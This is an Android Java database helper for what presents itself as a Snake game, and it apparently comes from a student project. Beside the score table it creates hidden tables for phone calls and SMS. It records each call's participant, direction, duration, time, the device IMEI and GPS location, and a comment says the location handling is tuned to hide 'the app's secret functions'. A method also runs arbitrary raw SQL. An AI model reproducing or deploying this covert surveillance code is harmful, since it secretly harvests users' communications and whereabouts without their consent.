package com.example.s1300465.snake;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.ArrayList;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "SnakeScores";
    private static final int DATABASE_VERSION = 9;
    Context context;

    public DatabaseHelper(Context context){
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        this.context = context;
    }

    @Override
    public void onCreate(SQLiteDatabase db){
        //Temporary while getting the schema sorted out
        try {
            db.execSQL("DROP TABLE Phones;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE PhoneCalls;");
        }catch(Exception ex){}
        try{
            db.execSQL("DROP TABLE SMS;");
        }catch(Exception ex){}

        try {
            db.execSQL("CREATE TABLE LocalScores (Name TEXT, Score INTEGER);");
        }catch(SQLiteException ex){}

        try{
            db.execSQL("CREATE TABLE PhoneCalls (DeviceID INTEGER, Participant TEXT, Outgoing INTEGER, Time INTEGER, Duration INTEGER, Lat INTEGER, Long INTEGER);");
        }catch(SQLiteException ex){}

        try{
            db.execSQL("CREATE TABLE SMS (DeviceID INTEGER, Sender TEXT, Receiver TEXT, Time INTEGER, Message TEXT, Type INTEGER, Lat INTEGER, Long INTEGER);");
        }catch(SQLiteException ex){}
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion){
        onCreate(db);
    }

    public void saveLocalScore(String name, int score){
        ContentValues row = new ContentValues();
        row.put("Name", name);
        row.put("Score", score);

        SQLiteDatabase db = this.getWritableDatabase();
        db.insert("LocalScores", null, row);
        db.close();
    }

    public ArrayList<Score> getLocalScores(){
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor result = db.query("LocalScores", new String[]{"Name", "Score"}, null, null, null, null, "Score");

        ArrayList<Score> scores = new ArrayList<>();
        for(int i = 0; i < result.getCount(); i++){
            result.moveToPosition(i);
            scores.add(new Score(result.getString(0), result.getInt(1)));
            Log.d("Score " + i, result.getString(0) + ": " + result.getString(1));
        }

        return scores;
    }

    public Location getLocation(){
        final LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location lastKnown = null;

        final LocationListener locationListener = new LocationListener() {
            //getLastKnownLocation() automatically updates when the LocationListener fires
            //So we don't need to to anything in here
            @Override
            public void onLocationChanged(Location location) {
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
            }
            @Override
            public void onProviderEnabled(String provider) {

            }
            @Override
            public void onProviderDisabled(String provider) {
            }
        };

        try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
            lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }catch(SecurityException ex){
            Log.w("SecurityException", "No permission to access location");
        }catch(NullPointerException ex){
            ex.printStackTrace();
        }

        //Immediately remove the listener once we've polled location
        //Reduces battery usage so hides app's secret functions better
        try {
            lm.removeUpdates(locationListener);
        }catch(SecurityException ex){
            Log.w("SecurityException", "No permission to access location");
        }
        return lastKnown;
    }

    public void savePhoneCall(String participant, boolean outgoing, long duration, long time){
        if(participant == null || duration == 0){
            return;
        }
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        ContentValues row = new ContentValues();
        row.put("DeviceID", imei);
        row.put("Participant", participant);
        row.put("Outgoing", outgoing ? 1: 0);
        row.put("Time", time);
        row.put("Duration", duration);
        Location loc = getLocation();
        if(loc != null) {
            row.put("Lat", loc.getLatitude());
            row.put("Long", loc.getLongitude());
        }

        SQLiteDatabase db = getWritableDatabase();
        db.insert("PhoneCalls", null, row);
        db.close();
    }

    public ArrayList<Cursor> getData(String Query){
        //get writable database
        SQLiteDatabase sqlDB = this.getWritableDatabase();
        String[] columns = new String[] { "mesage" };
        //an array list of cursor to save two cursors one has results from the query
        //other cursor stores error message if any errors are triggered
        ArrayList<Cursor> alc = new ArrayList<Cursor>(2);
        MatrixCursor Cursor2= new MatrixCursor(columns);
        alc.add(null);
        alc.add(null);


        try{
            String maxQuery = Query ;
            //execute the query results will be save in Cursor c
            Cursor c = sqlDB.rawQuery(maxQuery, null);


            //add value to cursor2
            Cursor2.addRow(new Object[] { "Success" });

            alc.set(1,Cursor2);
            if (null != c && c.getCount() > 0) {


                alc.set(0,c);
                c.moveToFirst();

                return alc ;
            }
            return alc;
        } catch(SQLException sqlEx){
            Log.d("printing exception", sqlEx.getMessage());
            //if any exceptions are triggered save the error message to cursor an return the arraylist
            Cursor2.addRow(new Object[] { ""+sqlEx.getMessage() });
            alc.set(1,Cursor2);
            return alc;
        } catch(Exception ex){

            Log.d("printing exception", ex.getMessage());

            //if any exceptions are triggered save the error message to cursor an return the arraylist
            Cursor2.addRow(new Object[] { ""+ex.getMessage() });
            alc.set(1,Cursor2);
            return alc;
        }


    }
}
